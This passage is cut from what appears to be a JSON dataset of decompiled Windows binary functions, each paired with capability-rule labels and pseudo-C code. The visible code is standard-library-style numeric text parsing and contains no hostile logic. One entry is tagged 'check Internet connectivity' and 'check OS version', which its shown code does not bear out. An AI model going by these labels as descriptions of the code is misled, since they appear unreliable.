*(unaff_EBP + 0x14), iVar12, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x0042bb12;\n    }\n    fcn.00421bb3(*(iVar12 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00428f0b(unaff_EBP + -0x88);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x7c) = piVar5;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x60);\n    (*pcVar1)();\n    uVar14 = *(iVar12 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x80);\n    *(unaff_EBP + -99) = 0;\n    *(unaff_EBP + -0x62) = 0;\n    fcn.00421bb3(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.004284ab(unaff_EBP + -0x88);\n    *(unaff_EBP + -4) = 1;\n    fcn.00401990();\n    pcVar1 = *(*piVar5 + 0x2c);\n    (**0x4742a4)(\"0123456789-+Ee\", 0x475a2b, unaff_EBP + -0x30);\n    (*pcVar1)();\n    uVar14 = *(unaff_EBP + -0x68);\n    cVar2 = fcn.00435185(uVar14);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar3 = *(arg_10h_00 + 6);\n        if (iVar3 == *(unaff_EBP + -0x1a)) {\n            puVar6 = *(unaff_EBP + -0x80);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00430056();\n                iVar3 = *(arg_10h_00 + 6);\n            }\n            if (iVar3 != *(unaff_EBP + -0x1c)) goto code_r0x0042b5b9;\n            puVar6 = *(unaff_EBP + -0x80);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.0042eb11();\n    }\n    else {\ncode_r0x0042b5b9:\n        puVar6 = *(unaff_EBP + -0x70);\n    }\n    piVar5 = *(unaff_EBP + -0x8c);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x84) = puVar6;\n    pcVar15 = puVar6 + 1;\n    *(unaff_EBP + -0x70) = pcVar15;\n    iVar12 = *piVar5;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x74) = 0;\n    *(unaff_EBP + -0x6c) = 0;\n    *(unaff_EBP + -0x94) = ((iVar12 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar13 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x78) = pcVar13;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar13 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x78) = pcVar13;\n    }\n    if ((*pcVar13 == '\\x7f') || (*pcVar13 < '\\x01')) {\n        cVar2 = fcn.00435185(uVar14);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                uVar7 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                iVar12 = *(unaff_EBP + -0x74);\n                if (*(unaff_EBP + -0x94) == iVar12 || *(unaff_EBP + -0x94) < iVar12) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar12 != 0)) {\n                    *pcVar15 = \"0123456789-+Ee\"[uVar7];\n                    pcVar15 = pcVar15 + 1;\n                    *(unaff_EBP + -0x74) = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.0042eb11();\n                cVar2 = fcn.00435185(uVar14);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x70) = pcVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x90) = 0;\n        }\n        else {\n            pcVar1 = *(**(unaff_EBP + -0x7c) + 0x10);\n            (**0x4742a4)();\n            uVar7 = (*pcVar1)();\n            *(unaff_EBP + -0x90) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        fcn.0040acd0(1, 0);\n        *(unaff_EBP + -4) = 3;\n        iVar12 = 0;\n        cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n        if (cVar2 != '\\0') {\n            pcVar13 = *(unaff_EBP + -0x48);\ncode_r0x0042b771:\n            do {\n                pcVar9 = *(unaff_EBP + -0x78);\n                while( true ) {\n                    if ((iVar12 == 0) || (cVar2 = *pcVar9,  cVar2 == '\\x7f')) goto code_r0x0042b7b9;\n                    iVar12 = iVar12 + -1;\n                    if (iVar12 != 0) {\n                        pcVar9 = unaff_EBP + -0x48;\n                        if (0xf < *(unaff_EBP + -0x34)) {\n                            pcVar9 = pcVar13;\n                        }\n                        if (cVar2 != pcVar9[iVar12]) goto code_r0x0042b7b5;\n                    }\n                    if (iVar12 == 0) {\n                        pcVar9 = unaff_EBP + -0x48;\n                        if (0xf < *(unaff_EBP + -0x34)) {\n                            pcVar9 = pcVar13;\n                        }\n                        if (cVar2 < *pcVar9) goto code_r0x0042b7b5;\n                    }\n                    pcVar9 = *(unaff_EBP + -0x78) + 1;\n                    if (*pcVar9 < '\\x01') break;\n                    *(unaff_EBP + -0x78) = pcVar9;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar7 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x74);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x94) == iVar8 || *(unaff_EBP + -0x94) < iVar8) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar15 = \"0123456789-+Ee\"[uVar7];\n                    pcVar15 = pcVar15 + 1;\n                    *(unaff_EBP + -0x70) = pcVar15;\n                    *(unaff_EBP + -0x74) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar8 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar8 + iVar12) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar8 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar8 + iVar12) = *(iVar8 + iVar12) + '\\x01';\n                }\n            }\n            else {\n                pcVar13 = *(unaff_EBP + -0x48);\n                pcVar9 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    pcVar9 = pcVar13;\n                }\n                if ((pcVar9[iVar12] == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x0042b756;\n                iVar3 = *(arg_10h_00 + 6);\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar3 = *(arg_10h_00 + 6);\n                    pcVar13 = *(unaff_EBP + -0x48);\n                }\n                if (iVar3 != *(unaff_EBP + -0x90)) goto code_r0x0042b756;\n                fcn.00406de0(1, 0);\n                iVar12 = iVar12 + 1;\n            }\n            fcn.0042eb11();\n            cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n        } while (cVar2 == '\\0');\n        pcVar13 = *(unaff_EBP + -0x48);\ncode_r0x0042b756:\n        if (iVar12 == 0) goto code_r0x0042b771;\n        pcVar9 = unaff_EBP + -0x48;\n        if (0xf < *(unaff_EBP + -0x34)) {\n            pcVar9 = pcVar13;\n        }\n        if ('\\0' < pcVar9[iVar12]) {\n            iVar12 = iVar12 + 1;\n            goto code_r0x0042b771;\n        }\ncode_r0x0042b7b5:\n        *(unaff_EBP + -99) = 1;\ncode_r0x0042b7b9:\n        *(unaff_EBP + -4) = 1;\n        fcn.00406810();\n        uVar14 = *(unaff_EBP + -0x68);\n    }\n    cVar2 = fcn.00435185(uVar14);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar3 = *(arg_10h_00 + 6);\n        pcVar1 = *(**(unaff_EBP + -0x7c) + 0xc);\n        (**0x4742a4)();\n        iVar4 = (*pcVar1)();\n        if (iVar3 == iVar4) {\n            puVar10 = fcn.0045b6c6();\n            puVar6 = *(unaff_EBP + -0x70);\n            *puVar6 = **puVar10;\n            pcVar15 = puVar6 + 1;\n            *(unaff_EBP + -0x70) = pcVar15;\n            fcn.0042eb11();\n        }\n        else {\n            pcVar15 = *(unaff_EBP + -0x70);\n        }\n        uVar14 = *(unaff_EBP + -0x68);\n    }\n    if ((**(unaff_EBP + -0x8c) != 1000000000) && (*(unaff_EBP + -0x74) == 0)) {\n        cVar2 = fcn.00435185(uVar14);\n        if (cVar2 == '\\0') {\n            iVar12 = *(unaff_EBP + -0x6c);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar12 = iVar12 + -1;\n                fcn.0042eb11();\n                cVar2 = fcn.00435185(uVar14);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x6c) = iVar12;\n            pcVar15 = *(unaff_EBP + -0x70);\n        }\n        iVar12 = *(unaff_EBP + -0x6c);\n        if (iVar12 < 0) {\n            *pcVar15 = '0';\n            pcVar15 = pcVar15 + 1;\n            *(unaff_EBP + -0x6c) = iVar12 + 1;\n        }\n    }\n    while (cVar2 = fcn.00435185(uVar14),  cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        uVar7 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n        if (9 < uVar7) break;\n        iVar12 = *(unaff_EBP + -0x74);\n        if (iVar12 < *(unaff_EBP + -0x94)) {\n            *pcVar15 = \"0123456789-+Ee\"[uVar7];\n            pcVar15 = pcVar15 + 1;\n            *(unaff_EBP + -0x74) = iVar12 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x62) = 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.0042eb11();\n    }\n    if (*(unaff_EBP + -0x62) != '\\0') {\n        pcVar13 = pcVar15 + -1;\n        if (pcVar13 == *(unaff_EBP + -0x84)) {\ncode_r0x0042b9a3:\n            *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n            *pcVar13 = '1';\n        }\n        else {\n            do {\n                ppcVar11 = fcn.0045b6c6();\n                cVar2 = *pcVar13;\n                if (cVar2 != **ppcVar11) {\n                    if (cVar2 != '9') {\n                        pcVar9 = *(unaff_EBP + -0x84);\n                        *pcVar13 = cVar2 + '\\x01';\n                        break;\n                    }\n                    *pcVar13 = '0';\n                }\n                pcVar9 = *(unaff_EBP + -0x84);\n                pcVar13 = pcVar13 + -1;\n            } while (pcVar13 != pcVar9);\n            if (pcVar13 == pcVar9) goto code_r0x0042b9a3;\n        }\n        uVar14 = *(unaff_EBP + -0x68);\n    }\n    cVar2 = *(unaff_EBP + -0x61);\n    pcVar13 = pcVar15;\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00435185(uVar14);\n        if (cVar2 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            iVar3 = *(arg_10h_00 + 6);\n            if (iVar3 != *(unaff_EBP + -0x16)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar3 = *(arg_10h_00 + 6);\n                }\n                if (iVar3 != *(unaff_EBP + -0x18)) goto code_r0x0042baf4;\n            }\n            *pcVar15 = 'e';\n            pcVar13 = pcVar15 + 1;\n            fcn.0042eb11();\n            iVar12 = 0;\n            *(unaff_EBP + -0x61) = 0;\n            *(unaff_EBP + -0x8c) = 0;\n            cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n            if (cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                iVar3 = *(arg_10h_00 + 6);\n                if (iVar3 == *(unaff_EBP + -0x1a)) {\n                    *pcVar13 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00430056();\n                        iVar3 = *(arg_10h_00 + 6);\n                    }\n                    if (iVar3 != *(unaff_EBP + -0x1c)) goto code_r0x0042ba5a;\n                    *pcVar13 = '-';\n                }\n                pcVar13 = pcVar15 + 2;\n                fcn.0042eb11();\n            }\ncode_r0x0042ba5a:\n            cVar2 = fcn.00435185(*(unaff_EBP + -0x68));\n            if (cVar2 == '\\0') {\n                uVar14 = *(unaff_EBP + -0x68);\n                do {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00430056();\n                    }\n                    if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                    *(unaff_EBP + -0x61) = 1;\n                    fcn.0042eb11();\n                    cVar2 = fcn.00435185(uVar14);\n                } while (cVar2 == '\\0');\n                iVar12 = *(unaff_EBP + -0x8c);\n                if (*(unaff_EBP + -0x61) != '\\0') {\n                    *pcVar13 = '0';\n                    pcVar13 = pcVar13 + 1;\n                }\n            }\n            while (cVar2 = fcn.00435185(*(unaff_EBP + -0x68)),  cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                uVar7 = fcn.0042758d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                if (iVar12 < 8) {\n                    *pcVar13 = \"0123456789-+Ee\"[uVar7];\n                    pcVar13 = pcVar13 + 1;\n                    iVar12 = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.0042eb11();\n            }\n        }\ncode_r0x0042baf4:\n        cVar2 = *(unaff_EBP + -0x61);\n    }\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar2 == '\\0')) {\n        pcVar13 = *(unaff_EBP + -0x80);\n    }\n    *pcVar13 = '\\0';\n    fcn.00406810();\ncode_r0x0042bb12:\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 5407
    },
    "0042bb18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1eh\n\nvoid __cdecl fcn.0042bb18(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t iVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    int32_t iVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1eh;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xa0);\n    iVar13 = *(unaff_EBP + 0x18);\n    iVar1 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0xa8) = *(unaff_EBP + 0xc);\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x1c);\n    fcn.00421bb3(uVar14);\n    *(unaff_EBP + -4) = 0;\n    piVar6 = fcn.00428e65(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x9c) = piVar6;\n    fcn.00401990();\n    pcVar2 = *(*piVar6 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x7c);\n    (*pcVar2)();\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.00421bb3(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00428405(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 1;\n    fcn.00401990();\n    pcVar2 = *(*piVar6 + 0x2c);\n    (**0x4742a4)(0x475a50, 0x475a6d, unaff_EBP + -0x4c);\n    (*pcVar2)();\n    uVar14 = *(unaff_EBP + -0x88);\n    puVar15 = *(unaff_EBP + -0xa8);\n    *(unaff_EBP + -0x7e) = 0;\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar10 = *(iVar1 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar15 = 0x2b;\n        }\n        else {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n                iVar10 = *(iVar1 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0042bc4c;\n            *puVar15 = 0x2d;\n        }\n        puVar15 = puVar15 + 1;\n        fcn.0042eb11();\n    }\ncode_r0x0042bc4c:\n    *puVar15 = 0x7830;\n    puVar15 = puVar15 + 1;\n    *(unaff_EBP + -0x7d) = 0;\n    *(unaff_EBP + -0x84) = puVar15;\n    *(unaff_EBP + -0x94) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        if (*(iVar1 + 6) == *(unaff_EBP + -0x4c)) {\n            fcn.0042eb11();\n            cVar4 = fcn.00435185(uVar14);\n            if (cVar4 == '\\0') {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                iVar10 = *(iVar1 + 6);\n                if (iVar10 != *(unaff_EBP + -0x1a)) {\n                    if (*(iVar1 + 4) == '\\0') {\n                        fcn.00430056();\n                        iVar10 = *(iVar1 + 6);\n                    }\n                    if (iVar10 != *(unaff_EBP + -0x1c)) goto code_r0x0042bcd6;\n                }\n                fcn.0042eb11();\n            }\n            else {\ncode_r0x0042bcd6:\n                *(unaff_EBP + -0x7d) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0xa0) = ((**(unaff_EBP + -0xac) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x7c;\n    *(unaff_EBP + -0x98) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x68)) {\n        pcVar12 = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x98) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar4 = fcn.00435185(uVar14);\n        if (cVar4 == '\\0') {\n            do {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n                if (0x15 < uVar7) break;\n                iVar13 = *(unaff_EBP + -0x94);\n                if (*(unaff_EBP + -0xa0) == iVar13 || *(unaff_EBP + -0xa0) < iVar13) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar13 != 0)) {\n                    *puVar15 = *(uVar7 + 0x475a50);\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x94) = iVar13 + 1;\n                }\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.0042eb11();\n                cVar4 = fcn.00435185(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x84) = puVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x6c) == 0) {\n            *(unaff_EBP + -0x90) = 0;\n        }\n        else {\n            pcVar2 = *(**(unaff_EBP + -0x9c) + 0x10);\n            (**0x4742a4)();\n            uVar7 = (*pcVar2)();\n            *(unaff_EBP + -0x90) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0xf;\n        *(unaff_EBP + -100) = 0;\n        fcn.0040acd0(1, 0);\n        *(unaff_EBP + -4) = 3;\n        iVar13 = 0;\n        cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar4 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x50);\n            iVar8 = *(unaff_EBP + -100);\ncode_r0x0042be9e:\n            do {\n                pcVar12 = *(unaff_EBP + -0x98);\n                while( true ) {\n                    if ((iVar13 == 0) || (cVar4 = *pcVar12,  cVar4 == '\\x7f')) goto code_r0x0042bf19;\n                    iVar13 = iVar13 + -1;\n                    if (iVar13 != 0) {\n                        *(unaff_EBP + -0x90) = unaff_EBP + -100;\n                        if (0xf < uVar7) {\n                            *(unaff_EBP + -0x90) = iVar8;\n                        }\n                        puVar15 = *(unaff_EBP + -0x84);\n                        if (cVar4 != *(*(unaff_EBP + -0x90) + iVar13)) goto code_r0x0042bf15;\n                    }\n                    if (iVar13 == 0) {\n                        *(unaff_EBP + -0x90) = unaff_EBP + -100;\n                        if (0xf < uVar7) {\n                            *(unaff_EBP + -0x90) = iVar8;\n                        }\n                        puVar15 = *(unaff_EBP + -0x84);\n                        if (cVar4 < **(unaff_EBP + -0x90)) goto code_r0x0042bf15;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x98) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x98) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n            if (uVar7 < 0x16) {\n                iVar8 = *(unaff_EBP + -0x94);\n                *(unaff_EBP + -0x7d) = 1;\n                if (*(unaff_EBP + -0xa0) == iVar8 || *(unaff_EBP + -0xa0) < iVar8) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *puVar15 = *(uVar7 + 0x475a50);\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x84) = puVar15;\n                    *(unaff_EBP + -0x94) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -100;\n                if (0xf < *(unaff_EBP + -0x50)) {\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (*(iVar8 + iVar13) != '\\x7f') {\n                    iVar8 = unaff_EBP + -100;\n                    if (0xf < *(unaff_EBP + -0x50)) {\n                        iVar8 = *(unaff_EBP + -100);\n                    }\n                    *(iVar8 + iVar13) = *(iVar8 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x50);\n                iVar8 = *(unaff_EBP + -100);\n                iVar11 = unaff_EBP + -100;\n                if (0xf < uVar7) {\n                    iVar11 = iVar8;\n                }\n                if ((*(iVar11 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x0042be7d;\n                iVar10 = *(iVar1 + 6);\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar10 = *(iVar1 + 6);\n                    uVar7 = *(unaff_EBP + -0x50);\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (iVar10 != *(unaff_EBP + -0x90)) goto code_r0x0042be7d;\n                fcn.00406de0(1, 0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.0042eb11();\n            cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        } while (cVar4 == '\\0');\n        uVar7 = *(unaff_EBP + -0x50);\n        iVar8 = *(unaff_EBP + -100);\ncode_r0x0042be7d:\n        if (iVar13 == 0) goto code_r0x0042be9e;\n        iVar11 = unaff_EBP + -100;\n        if (0xf < uVar7) {\n            iVar11 = iVar8;\n        }\n        if ('\\0' < *(iVar11 + iVar13)) {\n            iVar13 = iVar13 + 1;\n            goto code_r0x0042be9e;\n        }\ncode_r0x0042bf15:\n        *(unaff_EBP + -0x7e) = 1;\ncode_r0x0042bf19:\n        *(unaff_EBP + -4) = 1;\n        fcn.00406810();\n        uVar14 = *(unaff_EBP + -0x88);\n    }\n    if ((*(unaff_EBP + -0x7d) != '\\0') && (*(unaff_EBP + -0x94) == 0)) {\n        *puVar15 = 0x30;\n        puVar15 = puVar15 + 1;\n        *(unaff_EBP + -0x84) = puVar15;\n    }\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar10 = *(iVar1 + 6);\n        pcVar2 = *(**(unaff_EBP + -0x9c) + 0xc);\n        (**0x4742a4)();\n        iVar5 = (*pcVar2)();\n        if (iVar10 == iVar5) {\n            puVar9 = fcn.0045b6c6();\n            puVar3 = *(unaff_EBP + -0x84);\n            *puVar3 = **puVar9;\n            puVar15 = puVar3 + 1;\n            *(unaff_EBP + -0x84) = puVar15;\n            fcn.0042eb11();\n        }\n        else {\n            puVar15 = *(unaff_EBP + -0x84);\n        }\n        uVar14 = *(unaff_EBP + -0x88);\n    }\n    if (*(unaff_EBP + -0x94) == 0) {\n        cVar4 = fcn.00435185(uVar14);\n        if (cVar4 == '\\0') {\n            iVar13 = *(unaff_EBP + -0x8c);\n            do {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(iVar1 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                iVar13 = iVar13 + -1;\n                fcn.0042eb11();\n                cVar4 = fcn.00435185(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x8c) = iVar13;\n            puVar15 = *(unaff_EBP + -0x84);\n        }\n        iVar13 = *(unaff_EBP + -0x8c);\n        if (iVar13 < 0) {\n            *puVar15 = 0x30;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x8c) = iVar13 + 1;\n        }\n    }\n    while( true ) {\n        cVar4 = fcn.00435185(uVar14);\n        if (cVar4 != '\\0') break;\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        uVar7 = fcn.0042758d(unaff_EBP + -0x4c, *(iVar1 + 6));\n        if (0x15 < uVar7) break;\n        iVar13 = *(unaff_EBP + -0x94);\n        if (iVar13 < *(unaff_EBP + -0xa0)) {\n            *puVar15 = *(uVar7 + 0x475a50);\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x94) = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.0042eb11();\n    }\n    cVar4 = *(unaff_EBP + -0x7d);\n    puVar16 = puVar15;\n    if (cVar4 == '\\0') goto code_r0x0042c247;\n    cVar4 = fcn.00435185(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar1 + 4) == '\\0') {\n            fcn.00430056();\n        }\n        iVar10 = *(iVar1 + 6);\n        if (iVar10 != *(unaff_EBP + -0x16)) {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n                iVar10 = *(iVar1 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x18)) goto code_r0x0042c244;\n        }\n        *puVar15 = 0x70;\n        puVar16 = puVar15 + 1;\n        fcn.0042eb11();\n        iVar13 = 0;\n        *(unaff_EBP + -0x7d) = 0;\n        *(unaff_EBP + -0xa0) = 0;\n        cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar4 == '\\0') {\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            iVar10 = *(iVar1 + 6);\n            if (iVar10 == *(unaff_EBP + -0x1e)) {\n                *puVar16 = 0x2b;\n            }\n            else {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar10 = *(iVar1 + 6);\n                }\n                if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0042c1a1;\n                *puVar16 = 0x2d;\n            }\n            puVar16 = puVar15 + 1;\n            fcn.0042eb11();\n        }\ncode_r0x0042c1a1:\n        cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n        if (cVar4 == '\\0') {\n            uVar14 = *(unaff_EBP + -0x88);\n            do {\n                if (*(iVar1 + 4) == '\\0') {\n                    fcn.00430056();\n                }\n                if (*(iVar1 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.0042eb11();\n                cVar4 = fcn.00435185(uVar14);\n            } while (cVar4 == '\\0');\n            iVar13 = *(unaff_EBP + -0xa0);\n            if (*(unaff_EBP + -0x7d) != '\\0') {\n                *puVar16 = 0x30;\n                puVar16 = puVar16 + 1;\n            }\n        }\n        while( true ) {\n            cVar4 = fcn.00435185(*(unaff_EBP + -0x88));\n            if (cVar4 != '\\0') break;\n            if (*(iVar1 + 4) == '\\0') {\n                fcn.00430056();\n            }\n            uVar7 = fcn.0042758d(unaff_EBP + -0x4c, 